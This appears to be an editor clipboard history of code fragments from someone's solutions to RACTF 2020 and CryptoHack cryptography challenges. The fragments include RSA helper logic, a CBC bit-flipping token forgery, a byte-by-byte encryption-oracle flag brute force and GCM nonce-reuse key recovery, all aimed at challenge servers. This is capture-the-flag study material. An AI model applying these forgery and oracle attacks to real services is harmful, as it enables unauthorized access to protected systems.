cd3d8313cba43bc20c05ed951115e33b|file:///home/neo/CTFs/ractf2020/access/solve.py|7|1|V|python
	r = remote('88.198.219.20', 19334)
99af99c2c9588e86d57c6fc4063d3d8e|file:///home/neo/CTFs/ractf2020/speedy/template.py|94|9|V|python
	        s.send(r)
44887adb6b0f87dec505331249d10fad|file:///home/neo/CTFs/ractf2020/speedy/template.py|72|9|V|python
	        rem.sendline('test')
ce4885ae1d00e87d026100dc0d62f8ea|file:///home/neo/CTFs/ractf2020/speedy/template.py|45|5|V|python
	    print(mode)
89fac94d06884ab0c970bde79bbbc633|file:///home/neo/CTFs/ractf2020/speedy/template.py|20|1|V|python
	    # log.info(line)
	    # # Read until a prompt or line break
	    # try:
	    #     chunk = s.recv(4096)
	    #     buffer += chunk
	    #     print(chunk.decode(), end='')
	    # except BlockingIOError:
	    #     pass
	
	    # if b'\n' not in buffer and not buffer.endswith(b': '):
	    #     continue
	
	    # # Grab the oldest line
	    # buffer = buffer.split(b'\n', 1)
	    # if len(buffer) == 1:
	    #     line, buffer = buffer[0], b''
	    # else:
	    #     line, buffer = buffer
	
	    # # Lines start with [<code>]
	    # if line[:1] != b'[':
	    #     continue
	
6f31fc2db812a3b03eb95b5dc93661a0|file:///home/neo/CTFs/ractf2020/speedy/template.py|17|5|V|python
	    # while b'[!]' not in line
	    #     line += r.recvline()
b5d935ec4022807560c67b50d516b593|file:///home/neo/CTFs/ractf2020/speedy/template.py|13|14|v|python
	'88.198.219.20', 23241
feb1714bee88d21b8f590b5f56ec5799|file:///home/neo/CTFs/ractf2020/speedy/template.py|20|1|V|python
	    if mode == b'c':
	        p = 0
	        q = 0
	        e = 0
	        pt = 0
	        n = 0
	        phi = 0
	    elif mode == b':':
	        num = line[4:line.index(b': ')]    
	        if num == b'n':
	            n = int(line[line.index(b': ')+2:], 10)
	            # print('P: ', p)
	        if num == b'p':
	            p = int(line[line.index(b': ')+2:], 10)
	            # print('P: ', p)
	        if num == b'q':
	            q = int(line[line.index(b': ')+2:], 10)
	            # print('Q: ', q)
	        if num == b'e':
	            e = int(line[line.index(b': ')+2:], 10)
	            # print('e: ', e)
	        if num == b'ct':
	            ct = int(line[line.index(b': ')+2:], 10)
	            # print('Ct: ', ct)
	        if num == b'phi':
	            phi = int(line[line.index(b': ')+2:], 10)
	    elif mode == b'?':
	        sec = line[4:line.index(b': ')]   
	        if sec == b'd':
	            phi = (p-1) * (q-1)
	            r = mod_inverse(e, phi)
	            # print('d: ', r)
	        if sec == b'ct':
	            r = pow(pt, e, p*q)
	            # print('ct: ', r)
	        if sec == b'pt':
	            if q == 0:
	                q = phi//(p-1)
	            else:
	                phi = (p-1) * (q-1)
	            d = mod_inverse(e, phi)
	            r = pow(ct, d, p*q)
	            # print('pt: ', r)
	        if sec == b'n':
	            r = p * q
	            # print('n: ', r)
	        if sec == b'q':
	            r = n//p
	            # print('q: ', r)
	        r = bytes(str(r),'ascii')
65ddb67432bf3c9d47483c271acbd49e|file:///home/neo/CTFs/ractf2020/speedy/new.py|37|5|V|python
	    mode = line[1:2]
34e35229801d18eb369e963d562fc4ff|file:///home/neo/CTFs/ractf2020/speedy/new.py|87|5|V|python
	    if mode == b'*':
	        ...
	    elif mode == b'c':
	        ...
	    elif mode == b':':
	        ...
	    elif mode == b'!':
	        ...
	    elif mode == b'?':
	        ...
	    else:
	        ...
6465ec74397c9126916786bbcd6d7601|file:///home/neo/CTFs/ractf2020/speedy/new.py|3|7|v|python
	1.2.3.4
93c1fe99814e5802577f775bd13ba6ef|file:///home/neo/CTFs/ractf2020/speedy/template.py|1|1|V|python
	import socket
	from pwn import * # pip install pwntools
	from sympy.core.numbers import mod_inverse
2d4ab86ba4c64de7dc4b2e292b874ca7|file:///home/neo/CTFs/ractf2020/speedy/new.py|2|1|V|python
	import socket
920344b4c50df71a01fe68d12fa27373|file:///home/neo/CTFs/ractf2020/speedy/new.py|61|1|V|python
	        if num == b'ct':
	            ct = int(line[line.index(b': ')+2:], 10)
	            print('Ct: ', ct)
a2694fbb66e938e35c6c254c847ba8f6|file:///home/neo/CTFs/ractf2020/speedy/new.py|93|9|V|python
	        buffer = r
7f2db423a49b305459147332fb01cf87|file:///home/neo/CTFs/ractf2020/speedy/new.py|93|16|v|python
	buffer
4520b495eb6cddaa585aaf958d1f6650|file:///home/neo/CTFs/ractf2020/speedy/new.py|17|1|V|python
	        chunk = s.recv(4096)
f7efa4f864ae9b88d43527f4b14f750f|file:///home/neo/CTFs/ractf2020/speedy/new.py|18|24|v|python
	4096
8960f3ceadff60e4a4b9b3cb8dcb2583|file:///home/neo/CTFs/ractf2020/speedy/new.py|40|1|V|python
	    if mode == b'c':
	        p = 0
	        q = 0
	        e = 0
	        pt = 0
	        n = 0
	        phi = 0
	    elif mode == b':':
	        num = line[4:line.index(b': ')]    
	        if num == b'n':
	            n = int(line[line.index(b': ')+2:], 10)
	            # print('N: ', n)
	        if num == b'p':
	            p = int(line[line.index(b': ')+2:], 10)
	            # print('P: ', p)
	        if num == b'q':
	            q = int(line[line.index(b': ')+2:], 10)
	            # print('Q: ', q)
	        if num == b'e':
	            e = int(line[line.index(b': ')+2:], 10)
	            # print('e: ', e)
	        if num == b'ct':
	            ct = int(line[line.index(b': ')+2:], 10)
	            # print('Ct: ', ct)
	        if num == b'pt':
	            pt = int(line[line.index(b': ')+2:], 10)
	            # print('Pt: ', pt)
	        if num == b'phi':
	            phi = int(line[line.index(b': ')+2:], 10)
	    elif mode == b'?':
	        s.sendall(b'A')
	        sec = line[4:line.index(b': ')]   
	        if sec == b'd':
	            phi = (p-1) * (q-1)
	            r = mod_inverse(e, phi)
	            # print('d: ', r)
	        if sec == b'ct':
	            r = pow(pt, e, p*q)
	            # print('ct: ', r)
	        if sec == b'pt':
	            if q == 0:
	                q = phi//(p-1)
	            else:
	                phi = (p-1) * (q-1)
	            d = mod_inverse(e, phi)
	            r = pow(ct, d, p*q)
	            # print('pt: ', r)
	        if sec == b'n':
	            r = p * q
	            # print('n: ', r)
	        if sec == b'q':
	            r = n//p
	            # print('q: ', r)
d1ac20ab74e47f009feebe6b368dc31f|file:///home/neo/CTFs/ractf2020/speedy/template.py|20|5|V|python
	    if mode == b'c':
	        p = 0
	        q = 0
	        e = 0
	        pt = 0
	        n = 0
	        phi = 0
	    elif mode == b':':
	        num = line[4:line.index(b': ')]    
	        if num == b'n':
	            n = int(line[line.index(b': ')+2:], 10)
	            # print('P: ', p)
	        if num == b'p':
	            p = int(line[line.index(b': ')+2:], 10)
	            # print('P: ', p)
	        if num == b'q':
	            q = int(line[line.index(b': ')+2:], 10)
	            # print('Q: ', q)
	        if num == b'e':
	            e = int(line[line.index(b': ')+2:], 10)
	            # print('e: ', e)
	        if num == b'ct':
	            ct = int(line[line.index(b': ')+2:], 10)
	            # print('Ct: ', ct)
	        if num == b'phi':
	            phi = int(line[line.index(b': ')+2:], 10)
	    elif mode == b'?':
	        sec = line[4:line.index(b': ')]   
	        if sec == b'd':
	            phi = (p-1) * (q-1)
	            r = mod_inverse(e, phi)
	            # print('d: ', r)
	        if sec == b'ct':
	            r = pow(pt, e, p*q)
	            # print('ct: ', r)
	        if sec == b'pt':
	            if q == 0:
	                q = phi//(p-1)
	            else:
	                phi = (p-1) * (q-1)
	            d = mod_inverse(e, phi)
	            r = pow(ct, d, p*q)
	            # print('pt: ', r)
	        if sec == b'n':
	            r = p * q
	            # print('n: ', r)
	        if sec == b'q':
	            r = n//p
	            # print('q: ', r)
def4ea2802f51c6cf1f83c4bf1435886|file:///home/neo/CTFs/ractf2020/speedy/template.py|17|16|v|python
	recvline
a27aa79e21bc6b6b6cc8eadd53f0d206|file:///home/neo/CTFs/ractf2020/speedy/template.py|51|5|V|python
	        s.sendall(b'A')
ec4d2e8cc14a765acb32575de70a9966|file:///home/neo/CTFs/ractf2020/encryption_service/plaintext.txt|1|1|V|text
	To test the encryption service, encrypt this file with your company issued secret key and ensure that it results in the ciphertext.txt file.
add0d075d7d9cd7e20bc4fe8e7d48c8a|file:///home/neo/CTFs/ractf2020/mmm/secret|1|1|V|
	00111001 00110000 00111001 00111000 00111000 01100011 00111001 01100010
	01100101 01100110 01100101 00110101 01100101 01100001 00110011 01100110
	00110101 01100001 00111001 00110001 01100101 01100110 01100110 01100101
	00110000 00110011 00110000 00110110 00110000 01100001 00111000 00110111
	00110001 00110100 01100100 01100110 01100011 00110010 00110000 00110000
	00111000 00111000 00110100 00110001 00110101 00110101 00110111 00110000
	01100010 00110011 00111001 00110100 01100011 01100101 00111001 01100011
	01100100 00110011 00110010 01100010 01100101 00110111 00110001 00111000
71ff563daba479e7f8df3275476537cf|file:///home/neo/CTFs/ractf2020/mmm/dec.py|4|5|V|python
	    print(w)
c8f4f388b545b25f863955ebedb3489b|file:///home/neo/CTFs/ractf2020/mmm/dec.py|8|1|V|python
	pt = int(pt, 16)
c7b55d225fe392726b0daaa0700b8267|file:///home/neo/CTFs/ractf2020/mmm/backup|1|1|V|
	-----BEGIN OPENSSH PRIVATE KEY-----
1d96d3024e379b3a6b9083550e768be9|file:///home/neo/CTFs/ractf2020/mmm/backup|2|1|V|
	-----END OPENSSH PRIVATE KEY-----
f147784848b2fa57a9f485ea599abc89|file:///home/neo/CTFs/ractf2020/access/solve.py|9|1|V|python
	def xor_bytes(ba1: bytes, ba2: bytes) -> bytes:
	    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])
6bca9026ad8c22dcb16cc8ebb871f699|file:///home/neo/CTFs/ractf2020/speedy/reallySpeedyAlgo.py|11|9|V|python
	        print(lines)
d5769017324b7efe6a1051fefab2479c|file:///home/neo/CTFs/ractf2020/speedy/template.py|17|23|v|python
	.split(b'\n')
711625ccb63b13c6e4d89fd019ea8a9d|file:///home/neo/CTFs/ractf2020/speedy/template.py|20|1|V|python
	    print(sec)
f642114b622aceae433f0e2a7d15a299|file:///home/neo/CTFs/ractf2020/speedy/template.py|25|9|V|python
	        print(mode)
576e144d40921e0e4206273a98d00eea|file:///home/neo/CTFs/ractf2020/speedy/template.py|67|17|V|python
	                print('')
6770cc2d7bb26eb72895e6be0bf717a2|file:///home/neo/CTFs/ractf2020/speedy/template.py|23|9|V|python
	        # print(line)
01a27c4294c912ead6fe3786573f7b9c|file:///home/neo/CTFs/ractf2020/speedy/template.py|35|17|V|python
	                # print('N: ', n)
1bc4831b2449e9e6a5e20f9929183b39|file:///home/neo/CTFs/ractf2020/speedy/template.py|37|17|V|python
	                # print('P: ', p)
e6945fa88793a11ae53662ae5381b571|file:///home/neo/CTFs/ractf2020/speedy/template.py|39|17|V|python
	                # print('Q: ', q)
6ae8dd6923c211537b15a3cb9264ce5e|file:///home/neo/CTFs/ractf2020/speedy/template.py|41|17|V|python
	                # print('e: ', e)
d801f3874b64e5447f6c90574d0016ce|file:///home/neo/CTFs/ractf2020/speedy/template.py|43|17|V|python
	                # print('Ct: ', ct)
da5d06a03fe19471165e4ffe4327bfdb|file:///home/neo/CTFs/ractf2020/speedy/template.py|45|17|V|python
	                # print('Pt: ', pt)
b37758df7dce59282d3321a7b6dbc615|file:///home/neo/CTFs/ractf2020/speedy/template.py|52|17|V|python
	                # print('d: ', r)
76abc377ec2c5806f88ef765f08b05df|file:///home/neo/CTFs/ractf2020/speedy/template.py|54|17|V|python
	                # print('ct: ', r)
edd0a4e13963433db0d297e599a31a6b|file:///home/neo/CTFs/ractf2020/speedy/template.py|48|13|V|python
	            # sec = line[4:line.index(b': ')]   
3a46f69a511a52061d389b6045ce5fd1|file:///home/neo/CTFs/ractf2020/speedy/template.py|54|17|V|python
	                print('P:', p)
c8fd2ed4c1250f572ac6ffe44bcbc98c|file:///home/neo/CTFs/ractf2020/speedy/template.py|54|17|V|python
	                print('CT:', ct)
5740c1942d2a431c1d402d08d3a12c3e|file:///home/neo/CTFs/ractf2020/speedy/template.py|54|17|V|python
	                print('Phi: ', phi)
e858a9843b03f85e02c95754f2cdb587|file:///home/neo/CTFs/ractf2020/speedy/template.py|59|17|V|python
	                print('Q:',q)
6d1e2022c7ac65e3cbbbc0a2445a1547|file:///home/neo/CTFs/ractf2020/speedy/template.py|59|17|V|python
	                print('D:',d)
963b492fd162ec320abcf4b535ab9287|file:///home/neo/CTFs/ractf2020/speedy/template.py|60|17|V|python
	                # print('pt: ', r)
bb352fb364075d794805c7cb2ed11160|file:///home/neo/CTFs/ractf2020/speedy/template.py|62|17|V|python
	                # print('n: ', r)
d343dafe72272ef9325c4d3973b3bfe8|file:///home/neo/CTFs/ractf2020/speedy/template.py|64|17|V|python
	                # print('q: ', r)
94d25574a91102849ea23650edcea94b|file:///home/neo/CTFs/ractf2020/speedy/template.py|65|13|V|python
	            # print(r)
af599a7f9a3be13570a06b8e2c12e400|file:///home/neo/CTFs/ractf2020/speedy/template.py|66|15|V|python
	        # else:
	        #     print('error')
10d4b366f410a1275f7b684f07a28456|file:///home/neo/CTFs/ractf2020/speedy/reallySpeedyAlgo.py|5|8|v|python
	15258
91dbbf016d98b1b205c715bac44569c8|file:///home/neo/CTFs/ractf2020/access/access.py|16|1|V|python
	        cipher = AES.new(KEY, AES.MODE_CBC, iv)
e324c52726cea3ca66fe24bfc83298f5|file:///tmp/neomutt-neo-1000-9429-9223154641898178077|18|64|v|mail
	 and ask him what how I should start?
d35196fe9931dc67b34bbc644f0a8119|file:///home/neo/CTFs/ractf2020/teleport/solve.py|3|1|V|python
	from datetime import datetime, timedelta
	from Crypto.Util.Padding import pad, unpad
6e2400ec18b6f1952f1053c65df7a8b6|file:///home/neo/CTFs/ractf2020/teleport/solve.py|5|29|v|python
	19334
9e9ca208803f973c4df064847fcb9272|file:///home/neo/CTFs/ractf2020/teleport/solve.py|14|1|V|python
	target = pad(b"access=0000", 16)
0567fc33152a0928f416a06e05f60823|file:///home/neo/CTFs/ractf2020/teleport/solve.py|7|1|V|python
	def xor_bytes(ba1: bytes, ba2: bytes) -> bytes:
	    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])
	
	def json_recv():
	    line = r.recvline().replace(b"'", b'"')
	    return json.loads(line.decode())
	
be0ab6cd6c70c5fc6e07dea846d6e9bd|file:///home/neo/CTFs/ractf2020/teleport/solve.py|8|4|V|python
	start = int((datetime.today() + timedelta(days=1)).strftime("%s"))
	r.sendline('1')
	tok = bytes.fromhex(json_recv()['token'])
	end = int((datetime.today() + timedelta(days=1)).strftime("%s")) 
	iv = tok[:16]
	ct = tok[16:]
	original_first_block = ct[:16]
	original_second_block = ct[16:]
	for time in range(start-10, end+10, 1):
	    time = str(time)
	    try_token = pad(bytes(f"ry={time}",'ascii'), 16)
	    fake_block = xor_bytes(target, try_token)
	    fake_block= xor_bytes(original_first_block, fake_block)
	    fake_ct = fake_block + original_second_block
	    r.recvuntil('choice: ')
	    r.sendline('2')
	    r.recvuntil('token: ')
	    r.sendline(fake_ct.hex())
	    r.recvuntil('vector: ')
	    r.sendline(iv.hex())
	    res = json_recv()
	    if 'error' not in res:
	        print(res)
	    
0bcefa1c627e6884881e1fd8a0cb8533|file:///home/neo/CTFs/ractf2020/teleport/solve.py|10|1|V|python
	    x += math.sqrt(50)
4f6620466899e0fae44cbd2331c3d71b|file:///home/neo/CTFs/ractf2020/teleport/teleport.py|21|1|V|python
	    dist = math.sqrt(diff_x ** 2 + diff_z ** 2)
a494a6fc0a4e8539a781ca228abdeba9|file:///home/neo/CTFs/ractf2020/teleport/teleport.py|19|1|V|python
	    diff_x = new_x - x
	    diff_z = new_z - z
95ba9f088ca938b812268b3189a09778|file:///home/neo/CTFs/ractf2020/teleport/teleport.py|19|1|V|python
	    diff_x = new_x - x
	    diff_z = new_z - z
	    dist = math.sqrt(diff_x ** 2 + diff_z ** 2)
bfd9e6172e40ba166a529ed108f072cf|file:///home/neo/CTFs/ractf2020/teleport/solve.py|13|5|V|python
	    x += math.sqrt(50)
	    y += math.sqrt(50)
bb9b6ed4ddb62b38024523d7ce10f413|file:///home/neo/CTFs/ractf2020/teleport/solve.py|15|5|V|python
	    print(x,y)
fbbc65e22fe24f6a693d0dc8b74f55e8|file:///home/neo/CTFs/ractf2020/teleport/solve.py|15|5|V|python
	    print(dist)
1de8a26d46565a1ed381cb7b68c2796c|file:///home/neo/CTFs/ractf2020/teleport/solve.py|16|1|V|python
	#     r.recvuntil(': ')
107b3775642e74db793ebf3dd2ba7a05|file:///home/neo/CTFs/ractf2020/teleport/teleport.py|27|8|v|python
	x == 10000000000000 and z == 10000000000000:
269a9d2977e7943ceda25e18d6601744|file:///home/neo/CTFs/ractf2020/teleport/solve.py|9|21|v|python
	y = 100.0
667dc79da73b7502f3ffa05ffdf4dc9f|file:///home/neo/CTFs/ractf2020/teleport/solve.py|9|22|v|python
	flag_z
0881d8ced0d072e9c977de991213741d|file:///home/neo/CTFs/ractf2020/teleport/solve.py|9|14|v|python
	flag_x
2d9b5b05086430f72a97b5a0a4e1b71c|file:///home/neo/CTFs/ractf2020/encryption_service/solve.py|6|1|V|python
	# r = remote('socket.cryptohack.org', 13383, level = 'debug')
b11dcf5bd27e824f2939e86de7f642e4|file:///home/neo/CTFs/ractf2020/encryption_service/solve.py|2|1|V|python
	import json
	from datetime import datetime, timedelta
	from Crypto.Util.Padding import pad, unpad
610e68319fe4f5a1824c8400d019c5f9|file:///home/neo/CTFs/ractf2020/encryption_service/solve.py|5|1|V|python
	def xor_bytes(ba1: bytes, ba2: bytes) -> bytes:
	    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])
	
	def json_recv():
	    line = r.recvline().replace(b"'", b'"')
	    return json.loads(line.decode())
	
	target = pad(b"access=0000", 16)
	
	r.recvuntil('choice: ')
	start = int((datetime.today() + timedelta(days=1)).strftime("%s"))
	r.sendline('1')
	tok = bytes.fromhex(json_recv()['token'])
	end = int((datetime.today() + timedelta(days=1)).strftime("%s")) 
	iv = tok[:16]
	ct = tok[16:]
	original_first_block = ct[:16]
	original_second_block = ct[16:]
	for time in range(start-10, end+10, 1):
	    time = str(time)
	    try_token = pad(bytes(f"ry={time}",'ascii'), 16)
	    fake_block = xor_bytes(target, try_token)
	    fake_block= xor_bytes(original_first_block, fake_block)
	    fake_ct = fake_block + original_second_block
	    r.recvuntil('choice: ')
	    r.sendline('2')
	    r.recvuntil('token: ')
	    r.sendline(fake_ct.hex())
	    r.recvuntil('vector: ')
	    r.sendline(iv.hex())
	    res = json_recv()
	    if 'error' not in res:
	        print(res)
	    
082b5b7c59c96f012eab7d528848ba2f|file:///home/neo/CTFs/ractf2020/encryption_service/solve.py|21|13|V|python
	            print(c, enc[:3])
cbbc116f78b9eda1659b0586ca510e9a|file:///home/neo/CTFs/ractf2020/encryption_service/solve.py|12|9|V|python
	        s_len = len(sec) + 1
9837ede155a65ba209838b6dd30281f2|file:///home/neo/CTFs/ractf2020/encryption_service/solve.py|20|23|v|python
	s_len
76cd2e24e666a88ee3e7a7ac3721d4f0|file:///home/neo/CTFs/ractf2020/encryption_service/solve.py|13|9|V|python
	        print(sec+ c)
308deaaccdddd434e8df5c29f164b6e2|file:///home/neo/CTFs/ractf2020/encryption_service/solve.py|15|22|v|python
	[:len(sec
e7a1436ba0d855634758557e6bba2e95|file:///home/neo/CTFs/ractf2020/encryption_service/solve.py|19|9|V|python
	        print(enc[:-2], c)
ef0fe6eae7a63bde027688c47b123b10|file:///home/neo/CTFs/ractf2020/encryption_service/solve.py|19|9|V|python
	        # print(ct[:enc_len-2])
c0ca026553d2b360abae9342331e2b37|file:///home/neo/CTFs/ractf2020/encryption_service/solve.py|18|9|V|python
	        enc_len = (len(sec)) * 3 - 2
fdef5cbf7dacf9f289752409df693a38|file:///home/neo/CTFs/ractf2020/encryption_service/solve.py|19|9|V|python
	        print(enc[:enc_len])
4a7977e2379615e029b55eaef2d1ab7b|file:///home/neo/CTFs/ractf2020/encryption_service/solve.py|20|9|V|python
	        print(ct[:enc_len])
0293ae1eeb84a6b7b63d770e4da8f9b7|file:///home/neo/CTFs/ractf2020/encryption_service/solve.py|11|1|V|python
	    enc_len = (len(sec) + 1) * 3 - 2
381242cc7158ec1cbb0317ed92ecf547|file:///home/neo/CTFs/ractf2020/encryption_service/solve.py|12|5|V|python
	    print(ct[:enc_len])
59aeb2c9970b7b25be2fab2317e31fcb|file:///home/neo/CTFs/ractf2020/encryption_service/solve.py|9|1|v|python
	keywords
02d473b10e8edb96d19a7f4de78dd635|file:///home/neo/CTFs/ractf2020/encryption_service/solve.py|9|1|V|python
	app = [''.join(i) for i in itertools.product(alphabets, repeat = 3)]
	sec = 'ractf{'
	while True:
	    enc_len = (len(sec) + 1) * 3 - 1
	    found = False
	    print(ct[:enc_len])
	    for c in string.printable:
	        r.recvuntil('with: ')
	        r.sendline(sec + c)
	        r.recvuntil('encrypt: ')
	        r.sendline(pt)
	        r.recvuntil('is: ')
	        enc = r.recvline().decode('ascii')
	        # print(enc[:enc_len])
	        # print(c)
	        if enc[:enc_len] == ct[:enc_len]:
	            found = True
	            sec += c
	            print(sec)
	            break
	    if not found:
	        break
a34bc26f864ed5f404eac5b7a20cd9aa|file:///home/neo/CTFs/ractf2020/encryption_service/solve.py|9|46|v|python
	alphabets
2719506ecc32c23bb998a5bc6ecc5316|file:///home/neo/CTFs/ractf2020/encryption_service/solve.py|11|13|V|python
	for a in app:
	    print(a)
ee68b799282f86df6e240f6f1a12b5f7|file:///home/neo/CTFs/ractf2020/encryption_service/solve.py|14|1|V|python
	    enc_len = (len(sec) + 1) * 3 - 1
3848859a66b425770999db47c0c3692b|file:///home/neo/CTFs/ractf2020/encryption_service/solve.py|28|1|V|python
	    if not found:
	        break
bbad7cc3d9527a0b95e82bfecab59b14|file:///home/neo/CTFs/ractf2020/encryption_service/solve.py|21|1|V|python
	        # print(enc[:enc_len])
	        # print(c)
a065b87f7312a159f5eb3a0a21efd36d|file:///home/neo/CTFs/ractf2020/encryption_service/solve.py|14|14|v|python
	string.printable
5a46d586976981328ff51b7cc30650ee|file:///home/neo/CTFs/ractf2020/encryption_service/solve.py|22|15|v|python
	[:enc_len]
8440cba8eb80d9941317484e542bd640|file:///home/neo/CTFs/ractf2020/encryption_service/solve.py|21|9|V|python
	        enc_len
11eb461f45d0d29e22ac4df24f10d3d8|file:///home/neo/CTFs/ractf2020/encryption_service/solve.py|22|13|V|python
	            found = True
2f426fccc6797ceb9ea0200b18eaac7c|file:///home/neo/CTFs/ractf2020/encryption_service/solve.py|21|20|V|python
	        print(sec+c)
	        print(pt[:sec_len])
c44496cd3003708d5da5ff1d8b14d702|file:///home/neo/CTFs/ractf2020/encryption_service/solve.py|10|53|v|python
	ascii_letters
ee1f9b634569c7725c18f5de7f2e1f4d|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|31|1|V|python
	t0 = b'E\xd9\xdf\x9en\x99\x1d\xd9=\xcem\x8f$9>w'
	t1 = b']\x13MU\xe4\xcc\x08\x8d@\x89\x17\xdf\xb2\x8e\x97\x0e'
823e32c50435d70200c9118d2488e4bf|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|33|1|V|python
	ad = b'CryptoHack'
	c0 = b'\x13[/E'
	c1 = b'\x06\\?U'
f58367e56352b6933405f538dc7d6897|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|1|1|V|python
	BF.<X> = GF(2)[]
	FF.<A> = GF(2 ^ 128, modulus=X ^ 128 + X ^ 7 + X ^ 2 + X + 1)
236d6c971601b370f4b7d4e4303df0d8|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|31|1|V|python
	t0 = b'E\xd9\xdf\x9en\x99\x1d\xd9=\xcem\x8f$9>w'
	t1 = b']\x13MU\xe4\xcc\x08\x8d@\x89\x17\xdf\xb2\x8e\x97\x0e'
	ad = b'CryptoHack'
	padded_ad = b'CryptoHack\x06\x06\x06\x06\x06\x06'
	c0 = b'\x13[/E'
	c1 = b'\x06\\?U'
081ba8da5760a1fab4b30192f07a2432|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|5|1|V|python
	def int2ele(integer):
	    res = 0
	    for i in range(128):
	        # rightmost bit is x127
	        res += (integer & 1) * (A ^ (127 - i))
	        integer >>= 1
	    return res
	
	
	def ele2int(element):
	    integer = element.integer_representation()
	    res = 0
	    for i in range(128):
	        res = (res << 1) + (integer & 1)
	        integer >>= 1
	    return res
513cc0c0c3a413ff6df3088526fb72fb|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|26|1|V|python
	# t0 = '45d9df9e6e991dd93dce6d8f24393e77'
	# t1 = '5d134d55e4cc088d408917dfb28e970e'
	# ad = '43727970746f4861636b'
	# c0 = '135b2f45'
	# c1 = '065c3f55'
ce8b052dc12f738ff74925615958f01b|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|33|1|V|python
	t0 = 92847995657081002088797765460976811639
	t1 = 123718425799051876287128587136788240142
	ad = 318510233798766403609451
	padded_ad = 89652660640613370996072677544594638342
	c0 = 324742981
	c1 = 106708821
6c4cb33f33c3c0a6de22f2678e72f017|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|39|5|v|python
	 ''.join(str(b) for b in ad.nbits().digits(2))[::-1]
a0d21da217a2083e0ac43e58078eefcb|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|39|15|v|python
	''.join(str(b) for b in Integer(ad.nbits()).digits(2)).ljust(64, '0')[::-1]
5fc20a6c66df20c23f0eb64fafa93ea9|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|40|1|V|python
	c0_len_bits = ''.join(str(b) for b in Integer(c0.nbits()).digits(2)).ljust(64, '0')[::-1]
01292e114deb563d40003cc501db3da7|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|39|1|V|python
	ad_len_bits = ''.join(str(b) for b in Integer(ad.nbits()).digits(2)).ljust(64, '0')[::-1]
	c0_len_bits = ''.join(str(b) for b in Integer(c0.nbits()).digits(2)).ljust(64, '0')[::-1]
	c1_len_bits = ''.join(str(b) for b in Integer(c1.nbits()).digits(2)).ljust(64, '0')[::-1]
8e960a2d6f6a6d4e0df79d8191b52730|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|42|1|V|python
	l0 = int(ad_len_bits + c0_len_bits, 2)
c7080321cd059a0f0cbea52e31933ddb|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|45|1|V|python
	f = (c0 + c1) * x^2 + (padded_ad + padded_ad) * x + (t0 + t1)
89a0936217c02af057c70d0fbcbf1cea|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|45|1|V|python
	t0 = int2ele(t0)
2b5a3f657f5b261f1d36021412be19ca|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|45|1|V|python
	t0 = int2ele(t0)
	t1 = int2ele(t1)
	padded_ad = int2ele(padded_ad)
	c0 = int2ele(c0)
	c1 = int2ele(c1)
	
	f = (c0 + c1) * x^2 + (padded_ad + padded_ad) * x + (t0 + t1)
465a377cf5385c62d97d1b3032a3f55d|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|45|1|V|python
	t0 = int2ele(t0)
	t1 = int2ele(t1)
	padded_ad = int2ele(padded_ad)
	c0 = int2ele(c0)
	c1 = int2ele(c1)
27ccd3baa8049814be7b9f64e8c8b8aa|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|54|13|V|python
	sol_int = ele2int(sol)
	print(sol_int)
b7da891890a22381f03742ab439230cc|file:///home/neo/cryptohack/block-ciphers/gcm/solve.py|5|36|V|python
	# sys.path.insert(1, '~/cryptohack')
	# from general.xor.xor import *
5c733e1fece05987677f7361b18d45dc|file:///home/neo/cryptohack/block-ciphers/gcm/solve.py|4|1|V|python
	from Crypto.Util.number import getPrime, inverse, bytes_to_long, long_to_bytes
	
4ba2c30f4e0f47acc0a81767b4d9e0d4|file:///home/neo/cryptohack/block-ciphers/gcm/solve.py|22|1|V|python
	    key = 58690955595087993864702262660757681588
	    key = long_to_bytes(key)
0c2fa84f3237447c60c1e3fc835068d9|file:///home/neo/cryptohack/block-ciphers/gcm/solve.py|25|5|V|python
	    cipher
cd8580d0e0f567e9aeba8a566b1d9343|file:///home/neo/cryptohack/block-ciphers/gcm/solve.py|28|5|V|python
	    new_ct = cipher.update()
099fb995346f31c749f6e40db0f395e3|file:///home/neo/cryptohack/block-ciphers/gcm/solve.py|26|31|v|python
	header
fc2b3ddb9dbf35ce3e706c16aa2987fe|file:///home/neo/cryptohack/block-ciphers/gcm/solve.py|13|1|V|python
	    encrypted = requests.get(url= URL_ENCRYPT + test_pt).json()
2867f416598953476e209f55687de306|file:///home/neo/cryptohack/block-ciphers/gcm/solve.py|28|44|v|python
	test_pt
f71e9cfb222ff7c8e61f5b663f454360|file:///home/neo/cryptohack/block-ciphers/gcm/solve.py|11|5|V|python
	    plaintext = b'give me the flag'.hex()
ebe21f3cdccaa3c55a7953e78e98fdb9|file:///home/neo/cryptohack/block-ciphers/gcm/solve.py|12|5|V|python
	    test_pt = [b'abcd'.hex(), b'test'.hex()]
f280d3dba5a9b503d9227fc99b123676|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|36|1|V|python
	ad = 318510233798766403609451
1d8d52d37e8d78c8b9727f88bbfde989|file:///home/neo/cryptohack/block-ciphers/gcm/solve.py|10|1|V|python
	    header = b'CryptoHack'.hex()
ff1d0b22167b5aca9da1b864cacdbaa0|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|37|13|v|python
	89652660640613370996072677544594638342
178eb891ee68a2ef00aa013e0830a9a1|file:///home/neo/cryptohack/block-ciphers/gcm/solve.py|23|11|v|python
	58690955595087993864702262660757681588
